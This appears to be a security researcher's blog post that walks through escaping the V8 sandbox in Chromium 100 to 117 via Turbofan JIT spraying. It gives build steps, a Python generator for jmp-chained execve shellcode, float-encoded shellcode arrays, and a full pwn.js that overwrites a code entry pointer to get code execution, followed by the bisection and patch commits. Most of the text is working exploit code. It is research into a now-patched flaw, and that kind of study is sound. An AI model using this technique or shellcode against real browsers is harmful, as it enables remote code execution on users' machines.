# Escaping V8 Sandbox via Turbofan JIT Spraying (100.0.4896.60 <= Chromium < 117.0.5938.62)

In this post, I will explain how to escape V8 sandbox to get RCE via Turbofan JIT spraying, while we have limited exploitation primitives like `addrof` and sandboxed AAR/AAW.

## Setup

- Ubuntu 22.04.5 LTS
- [4512c6eb7189c21f39420ddf8d9ff4f05a4a39b4](https://chromium.googlesource.com/v8/v8/+/4512c6eb7189c21f39420ddf8d9ff4f05a4a39b4) (Jul 11th, 2023)

`setup.zsh`:
```zsh
#!/bin/zsh

# install depot_tools
git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git ~/depot_tools
echo "\nexport PATH=\$HOME/depot_tools:\$PATH
export NINJA_SUMMARIZE_BUILD=1" >>~/.zshrc
source ~/.zshrc

# get v8
mkdir ~/v8
git clone https://chromium.googlesource.com/v8/v8.git ~/v8/v8
cd ~/v8/v8
git checkout 4512c6eb7189c21f39420ddf8d9ff4f05a4a39b4

# sync submodules
cd ..
echo 'solutions = [
  {
    "name": "v8",
    "url": "https://chromium.googlesource.com/v8/v8.git",
    "deps_file": "DEPS",
    "managed": False,
    "custom_deps": {},
  },
]' >.gclient
gclient sync -D

# install dependencies
cd v8
./build/install-build-deps.sh

# install gdb plugin
echo "\nsource $HOME/v8/v8/tools/gdbinit" >>~/.gdbinit

# build v8
gn gen out/debug --args='target_os="linux" target_cpu="x64" v8_expose_memory_corruption_api=true is_component_build=false v8_optimized_debug=false'
gn gen out/release --args='target_os="linux" target_cpu="x64" v8_expose_memory_corruption_api=true is_debug=false'
autoninja -C out/debug d8
autoninja -C out/release d8
```

## Exploitation

### Implement exploitation primitives

We can implement sandboxed `addrof` primitive which returns address of arbitrary JavaScript object in V8 sandbox, using `Sandbox.getAddressOf`. Also, we can implement sandboxed AAR/AAW primitives which read and write value at arbitrary address in V8 sandbox, using `Sandbox.MemoryView`.

### JIT (Just-In-Time) spraying

```js
function jit() {
    return [1.1, 2.2, 3.3];
}

for (let i = 0; i < 0x10000; i++) { jit(); jit(); } // compile via turbofan

% DebugPrint(jit);
```

![[Pasted image 20250102181631.png]]

![[Pasted image 20250102181654.png]]

![[Pasted image 20250102181715.png]]

![[Pasted image 20250102181746.png]]

`jit()` is a function which returns an array consisted of float numbers. After `jit()` is compiled via Turbofan, the numbers in returned array are inserted to the optimized code as raw numbers. It means that we can insert arbitrary 8-byte numbers to executable code region.

When `jit()` is called, `rip` moves to `instruction_start` pointer in `code` of `jit()`, which is inside of V8 sandbox. Using sandboxed AAW primitive, we can overwrite `instruction_start` pointer with arbitrary value, e.g. the address of number which we inserted to the optimized code. If so, the number acts like an 8-byte shellcode.

### Construct shellcode chain

With just 8-byte shellcode, we won't be able to do what we want to do. Instead, we can chain several short shellcodes using `jmp` instruction.

`shellcode.py`:
```python
import pwn
import binascii
import struct

pwn.context(arch="amd64")


shellcode = []

# rdi == "/bin/xcalc"
shellcode.append(pwn.asm("xor rax, rax"))
shellcode.append(pwn.asm(f"mov ax, {int(binascii.hexlify(b'lc'[::-1]), 16)}"))
shellcode.append(pwn.asm("push rax"))
shellcode.append(pwn.asm(f"mov eax, {int(binascii.hexlify(b'/xca'[::-1]), 16)}"))
shellcode.append(pwn.asm("shl rax, 32"))
shellcode.append(pwn.asm(f"add rax, {int(binascii.hexlify(b'/bin'[::-1]), 16)}"))
shellcode.append(pwn.asm("push rax"))
shellcode.append(pwn.asm("mov rdi, rsp"))

# rsi == 0
shellcode.append(pwn.asm("xor rsi, rsi"))

# rax == "DISPLAY=:0"
shellcode.append(pwn.asm("xor rax, rax"))
shellcode.append(pwn.asm(f"mov ax, {int(binascii.hexlify(b':0'[::-1]), 16)}"))
shellcode.append(pwn.asm("push rax"))
shellcode.append(pwn.asm(f"mov eax, {int(binascii.hexlify(b'LAY='[::-1]), 16)}"))
shellcode.append(pwn.asm("shl rax, 32"))
shellcode.append(pwn.asm(f"add rax, {int(binascii.hexlify(b'DISP'[::-1]), 16)}"))
shellcode.append(pwn.asm("push rax"))
shellcode.append(pwn.asm("mov rax, rsp"))

# rdx == ["DISPLAY=:0", 0]
shellcode.append(pwn.asm("xor rbx, rbx"))
shellcode.append(pwn.asm("push rbx"))
shellcode.append(pwn.asm("push rax"))
shellcode.append(pwn.asm("mov rdx, rsp"))

# rax == 0x3b (execve)
shellcode.append(pwn.asm("xor rax, rax"))
shellcode.append(pwn.asm("mov al, 0x3b"))

# syscall => execve("/bin/xcalc", 0, ["DISPLAY=:0", 0])
shellcode.append(pwn.asm("syscall"))


# chain

jmp = b"\xeb\x0c"  # jmp 0xc
nop = b"\x90"
segment = b""

for i in range(len(shellcode)):
    assert len(shellcode[i]) <= 6

    if len(segment) + len(shellcode[i]) < 6:
        segment += shellcode[i]
    else:
        segment = segment.ljust(6, nop)
        segment += jmp
        print(f"{struct.unpack('<d', segment)[0]}, // {hex(pwn.u64(segment))}")
        segment = shellcode[i]

    if i == len(shellcode) - 1:  # last
        segment = segment.ljust(8, nop)
        print(f"{struct.unpack('<d', segment)[0]} // {hex(pwn.u64(segment))}")
```

![[Pasted image 20250102183336.png]]

```js
function jit() {
    return [
        1.9711828996832522e-246, // 0xceb909090c03148
        1.971112871410787e-246, // 0xceb9050636cb866
        1.9711314215434657e-246, // 0xceb906163782fb8
        1.97118242283721e-246, // 0xceb909020e0c148
        1.9616425752617766e-246, // 0xceb6e69622f0548
        1.9711832695973408e-246, // 0xceb9090e7894850
        1.971182900582351e-246, // 0xceb909090f63148
        1.9711828996832522e-246, // 0xceb909090c03148
        1.971112653196158e-246, // 0xceb9050303ab866
        1.9710920957760286e-246, // 0xceb903d59414cb8
        1.97118242283721e-246, // 0xceb909020e0c148
        1.9532382542574046e-246, // 0xceb505349440548
        1.971183239760578e-246, // 0xceb9090e0894850
        1.9711128050518315e-246, // 0xceb905053db3148
        1.971182900255075e-246, // 0xceb909090e28948
        1.9710902863710406e-246, // 0xceb903bb0c03148
        -6.828527034370483e-229 // 0x909090909090050f
    ];
}

for (let i = 0; i < 0x10000; i++) { jit(); jit(); } // compile via turbofan

% DebugPrint(jit);
```

![[Pasted image 20250102183433.png]]

If there are same numbers in the array which `jit()` returns, the optimized code remembers that number in register and reuse it later. If so, chain is broken and shellcode doesn't work. Therefore, we should slightly change the order of instructions or move the position of `nop` instructions to make sure that all numbers are different, like following:

```js
function jit() {
    return [
        1.9711828996832522e-246, // 0xceb909090c03148
        1.971112871410787e-246, // 0xceb9050636cb866
        1.9711314215434657e-246, // 0xceb906163782fb8
        1.97118242283721e-246, // 0xceb909020e0c148
        1.9616425752617766e-246, // 0xceb6e69622f0548
        1.9711832695973408e-246, // 0xceb9090e7894850
        1.971182900582351e-246, // 0xceb909090f63148
        1.9711831018987653e-246, // 0xceb9090c0314890 (edited)
        1.971112653196158e-246, // 0xceb9050303ab866
        1.9710920957760286e-246, // 0xceb903d59414cb8
        1.9710610293119303e-246, // 0xceb9020e0c14890 (edited)
        1.9532382542574046e-246, // 0xceb505349440548
        1.971183239760578e-246, // 0xceb9090e0894850
        1.9711128050518315e-246, // 0xceb905053db3148
        1.971182900255075e-246, // 0xceb909090e28948
        1.9710902863710406e-246, // 0xceb903bb0c03148
        -6.828527034370483e-229 // 0x909090909090050f
    ];
}
```

`pwn.js`:
```js
const RELEASE = true;

// convert integer to hexadecimal string
function hex(i) {
    return `0x${i.toString(16)}`;
}

// get (compressed) address of `obj` in sandbox
function addrof(obj) {
    return Sandbox.getAddressOf(obj);
}

// read 4-byte from `addr` in sandbox
function read4(addr) {
    let memory_view = new DataView(new Sandbox.MemoryView(addr, 4));
    return memory_view.getUint32(0, true);
}

// read 8-byte from `addr` in sandbox
function read8(addr) {
    let memory_view = new DataView(new Sandbox.MemoryView(addr, 8));
    return memory_view.getBigUint64(0, true);
}

// write 4-byte `value` to `addr` in sandbox
function write4(addr, value) {
    let memory_view = new DataView(new Sandbox.MemoryView(addr, 4));
    memory_view.setUint32(0, value, true);
}

function jit() {
    return [
        1.9711828996832522e-246, // 0xceb909090c03148
        1.971112871410787e-246, // 0xceb9050636cb866
        1.9711314215434657e-246, // 0xceb906163782fb8
        1.97118242283721e-246, // 0xceb909020e0c148
        1.9616425752617766e-246, // 0xceb6e69622f0548
        1.9711832695973408e-246, // 0xceb9090e7894850
        1.971182900582351e-246, // 0xceb909090f63148
        1.9711831018987653e-246, // 0xceb9090c0314890
        1.971112653196158e-246, // 0xceb9050303ab866
        1.9710920957760286e-246, // 0xceb903d59414cb8
        1.9710610293119303e-246, // 0xceb9020e0c14890
        1.9532382542574046e-246, // 0xceb505349440548
        1.971183239760578e-246, // 0xceb9090e0894850
        1.9711128050518315e-246, // 0xceb905053db3148
        1.971182900255075e-246, // 0xceb909090e28948
        1.9710902863710406e-246, // 0xceb903bb0c03148
        -6.828527034370483e-229 // 0x909090909090050f
    ];
}

// jit spraying
console.log("[+] JIT spraying...");
for (let i = 0; i < 0x10000; i++) { jit(); jit(); } // compile via turbofan

let jit_addr = addrof(jit);
// console.log(`[+] jit_addr == ${hex(jit_addr)}`);

let code_addr = read4(jit_addr + 0x18) - 1;
// console.log(`[+] code_addr == ${hex(code_addr)}`);

let instruction_start = read8(code_addr + 0x10);
console.log(`[+] instruction_start == ${hex(instruction_start)}`);
let shellcode_addr = RELEASE ? instruction_start + 0x59n : instruction_start + 0x72n;

// overwrite instruction_start with address of shellcode
write4(code_addr + 0x10, Number(shellcode_addr & 0xffffffffn));

// execute shellcode
console.log("[+] Executing shellcode...");
jit();
```

![[Pasted image 20250102184322.png]]

## Bisection

> [[ext-code-space] Enable external code space on x64 and desktop arm64](https://chromium.googlesource.com/v8/v8/+/7fc4868e477cc7cb7ef8c304fff214ea83498e7a) (Jan 24th, 2022)

[`v8_enable_external_code_space`](https://source.chromium.org/chromium/v8/v8/+/7fc4868e477cc7cb7ef8c304fff214ea83498e7a:BUILD.gn;l=415) was set to `true` in `x64` in the commit above, so [`code_entry_point`](https://source.chromium.org/chromium/v8/v8/+/7fc4868e477cc7cb7ef8c304fff214ea83498e7a:src/objects/code.h;l=86) in [`CodeDataContainer`](https://source.chromium.org/chromium/v8/v8/+/7fc4868e477cc7cb7ef8c304fff214ea83498e7a:src/objects/code.h;l=46) became available. As a result, the exploitation technique explained in this post was introduced.

## Patch

> [[sandbox] Enable code pointer sandboxing](https://chromium.googlesource.com/v8/v8/+/c8d039b05081b474ef751411a5c76ca01900e49a) (Jul 11th, 2023)
> [Revert "[sandbox] Enable code pointer sandboxing"](https://chromium.googlesource.com/v8/v8/+/bc795ebd90a5a7c957b644da5fac369eb88aa87a) (Jul 11th, 2023)
> [Reland "[sandbox] Enable code pointer sandboxing"](https://chromium.googlesource.com/v8/v8/+/7df23d5163a10a12e4b4262dd4e78cfb7ec97be0) (Jul 11th, 2023)